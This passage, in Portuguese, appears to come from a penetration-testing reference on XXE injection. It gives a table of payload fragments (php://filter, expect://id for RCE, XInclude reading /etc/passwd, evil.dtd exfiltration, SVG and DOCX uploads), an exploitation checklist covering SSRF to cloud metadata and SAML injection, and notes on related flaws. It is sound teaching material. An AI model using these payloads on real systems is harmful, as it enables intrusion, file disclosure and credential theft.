| `php://filter/convert.base64-encode/resource=X` | Arquivo em base64 (bypass restrição charset) |
| `expect://id`                                   | RCE via PHP (módulo expect habilitado)       |
| `%file;` + DTD externo                          | OOB exfiltration via HTTP                    |
| `<xi:include href="file:///etc/passwd">`        | XInclude sem DOCTYPE                         |
| evil.dtd com `%eval;`/`%exfil;`                 | Error-based ou OOB exfil                     |
| SVG com `<!DOCTYPE svg [...]>`                  | XXE via upload de imagem                     |
| DOCX com XML interno modificado                 | XXE via upload de documento Office           |

---

## Checklist de Exploração XXE

```
[ ] Identificar endpoints que processam XML (SOAP, import, upload)
[ ] Testar entidade simples: <!ENTITY test "testvalue"> -> &test;
[ ] Tentar file:///etc/passwd com entidade SYSTEM
[ ] Tentar php://filter/convert.base64-encode para arquivos com chars especiais
[ ] SSRF via entidade apontando para 127.0.0.1 ou metadata cloud
[ ] Se resposta não reflete: tentar OOB com DTD externo + interactsh
[ ] Error-based: entidade apontando para arquivo inexistente com conteúdo no path
[ ] XInclude se DOCTYPE estiver bloqueado
[ ] SVG upload se aplicação aceita imagens
[ ] DOCX/XLSX upload se aplicação aceita documentos Office
[ ] SAML: decodificar SAMLResponse, injetar XXE, reenviar
[ ] Documentar arquivos lidos, credenciais encontradas
```

---

## Módulos Relacionados

XXE e SSRF se encadeiam quando a entidade externa aponta para uma URL interna: o parser XML vira cliente HTTP não intencional, acessando recursos que deveriam ser inacessíveis externamente. File Upload é um vetor de entrega frequente — SVG e DOCX são formatos XML cuja estrutura interna permite incluir entidades externas maliciosas em uploads aparentemente benignos. Quando XXE é explorado via schema `file://`, o impacto converge com LFI: ambos resultam em leitura arbitrária de arquivos locais, diferindo apenas no mecanismo (parser XML vs. include de arquivo). Referências normativas: OWASP Top 10 A05:2021 — Security Misconfiguration; CWE-611: Improper Restriction of XML External Entity Reference.
